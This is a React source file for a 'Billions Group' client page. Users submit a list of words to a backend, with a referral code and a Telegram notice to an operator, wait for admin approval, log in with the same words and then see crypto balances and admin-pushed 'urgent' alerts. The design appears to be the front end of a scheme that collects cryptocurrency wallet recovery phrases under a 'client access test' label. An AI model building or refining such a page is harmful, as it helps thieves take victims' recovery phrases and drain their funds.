import { useEffect, useMemo, useState } from 'react'
import api, { apiErrorMessage } from '../api/adminApi.js'

const sampleWords = 'market river window signal yellow carbon silver garden orbit velvet anchor'
const assets = ['usdt', 'btc', 'eth', 'bnb', 'tron']

function normalizeWords(value) {
  return String(value || '')
    .split(/[\s,]+/)
    .map(word => word.trim())
    .filter(Boolean)
}

function formatMoney(value) {
  if (value == null) return 'Waiting'
  return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(Number(value || 0))
}

function BalanceList({ balances = {} }) {
  return (
    <div className="client-balances">
      {assets.map(asset => (
        <div key={asset}>
          <span>{asset.toUpperCase()}</span>
          <strong>{Number(balances[asset] || 0).toLocaleString(undefined, { maximumFractionDigits: 8 })}</strong>
        </div>
      ))}
    </div>
  )
}

export default function ClientPage() {
  const [title, setTitle] = useState('Client visit test')
  const [words, setWords] = useState(sampleWords)
  const [batch, setBatch] = useState(null)
  const [account, setAccount] = useState(null)
  const [status, setStatus] = useState('')
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [checking, setChecking] = useState(false)
  const [alerts, setAlerts] = useState([])
  const wordCount = useMemo(() => normalizeWords(words).length, [words])
  const referralCode = useMemo(() => new URLSearchParams(window.location.search).get('ref') || '', [])

  async function submitWords(event) {
    event.preventDefault()
    setSubmitting(true)
    setError('')
    setStatus('')
    setAccount(null)

    try {
      const { data } = await api.post('/words', {
        title,
        words,
        referral: referralCode || undefined,
      })
      setBatch(data.batch)
      if (data.batch?.account) {
        setAccount(data.batch.account)
        setStatus('Approved account found. The client is signed in.')
      } else {
        setStatus(data.telegram?.message || 'Words submitted for approval.')
      }
    } catch (requestError) {
      setError(apiErrorMessage(requestError))
    } finally {
      setSubmitting(false)
    }
  }

  async function checkStatus() {
    if (!batch?.id) return
    setChecking(true)
    setError('')
    try {
      const { data } = await api.get(`/words/${batch.id}/status`)
      setBatch(data.batch)
      if (data.batch?.account) {
        setAccount(data.batch.account)
        setStatus('Approved account found. The client is signed in.')
      } else {
        setStatus(`Current status: ${data.batch?.approvalStatus || 'pending'}`)
      }
    } catch (requestError) {
      setError(apiErrorMessage(requestError))
    } finally {
      setChecking(false)
    }
  }

  async function loginWithWords() {
    setChecking(true)
    setError('')
    try {
      const { data } = await api.post('/words/auto-login', { words })
      setAccount(data.account)
      setBatch(data.account?.batch || batch)
      setStatus('Client login complete.')
    } catch (requestError) {
      setError(apiErrorMessage(requestError))
    } finally {
      setChecking(false)
    }
  }

  useEffect(() => {
    if (!batch?.id || batch.approvalStatus !== 'pending' || account) return undefined
    const timer = window.setInterval(checkStatus, 8000)
    return () => window.clearInterval(timer)
  }, [batch?.id, batch?.approvalStatus, account])

  useEffect(() => {
    if (!account?.accountNumber) return undefined
    let active = true
    const dismissedKey = `dismissed_alerts_${account.accountNumber}`
    async function loadAlerts() {
      try {
        const { data } = await api.get(`/alerts/user/${encodeURIComponent(account.accountNumber)}`)
        const dismissed = JSON.parse(localStorage.getItem(dismissedKey) || '[]')
        if (active) setAlerts((data.alerts || []).filter(alert => !dismissed.includes(String(alert.id))))
      } catch { /* Account data remains usable if alerts cannot be loaded. */ }
    }
    loadAlerts()
    const timer = window.setInterval(loadAlerts, 30000)
    return () => { active = false; window.clearInterval(timer) }
  }, [account?.accountNumber])

  function dismissAlert(id) {
    const key = `dismissed_alerts_${account.accountNumber}`
    const dismissed = (() => {
      try { return JSON.parse(localStorage.getItem(key) || '[]') } catch { return [] }
    })()
    localStorage.setItem(key, JSON.stringify([...new Set([...dismissed, String(id)])]))
    setAlerts(current => current.filter(alert => alert.id !== id))
  }

  return (
    <main className="client-page">
      {alerts[0] && <div className="user-alert-backdrop" role="presentation">
        <section className={`user-alert-modal ${alerts[0].severity}`} role="alertdialog" aria-modal="true" aria-labelledby="user-alert-title">
          <span className="user-alert-label">{alerts[0].severity === 'error' ? 'Urgent notice' : 'Account notice'}</span>
          <h2 id="user-alert-title">{alerts[0].title}</h2>
          <p>{alerts[0].message}</p>
          {alerts.length > 1 && <small>{alerts.length - 1} more alert{alerts.length > 2 ? 's' : ''} waiting</small>}
          <button className="primary-button" type="button" onClick={() => dismissAlert(alerts[0].id)}>Dismiss</button>
        </section>
      </div>}
      <section className="client-hero">
        <div className="client-copy">
          <span className="eyebrow">Billions Group</span>
          <h1>Client access test</h1>
          <p>Submit a word set, wait for admin approval, then enter the same words to open the account view.</p>
          {referralCode && <p className="client-referral">Referral test active: <code>{referralCode}</code></p>}
        </div>
        <form className="client-form" onSubmit={submitWords}>
          <label>
            Account label
            <input value={title} maxLength={255} onChange={event => setTitle(event.target.value)} />
          </label>
          <label>
            Words
            <textarea rows={7} value={words} onChange={event => setWords(event.target.value)} />
          </label>
          <div className="client-form-footer">
            <span>{wordCount} words</span>
            <button className="primary-button" type="submit" disabled={submitting || wordCount === 0}>
              {submitting ? 'Submitting...' : 'Submit words'}
            </button>
          </div>
        </form>
      </section>

      {(error || status || batch) && (
        <section className="client-status-panel">
          {error && <p className="alert error" role="alert">{error}</p>}
          {status && <p className="alert success" role="status">{status}</p>}
          {batch && (
            <div className="client-status-grid">
              <div>
                <span>Batch</span>
                <strong>#{batch.id}</strong>
              </div>
              <div>
                <span>Status</span>
                <strong>{batch.approvalStatus || 'pending'}</strong>
              </div>
              <div>
                <span>Words</span>
                <strong>{batch.wordCount || wordCount}</strong>
              </div>
            </div>
          )}
          <div className="client-actions">
            <button className="secondary-button" type="button" disabled={!batch?.id || checking} onClick={checkStatus}>
              {checking ? 'Checking...' : 'Check status'}
            </button>
            <button className="secondary-button" type="button" disabled={checking || wordCount === 0} onClick={loginWithWords}>
              Login with words
            </button>
          </div>
        </section>
      )}

      {account && (
        <section className="client-account">
          <div>
            <span className="eyebrow">Account</span>
            <h2>{account.title || 'Approved client account'}</h2>
            <p>{account.accountNumber}</p>
          </div>
          <strong className="client-total">{formatMoney(account.totalUsd)}</strong>
          <BalanceList balances={account.balances} />
        </section>
      )}
    </main>
  )
}
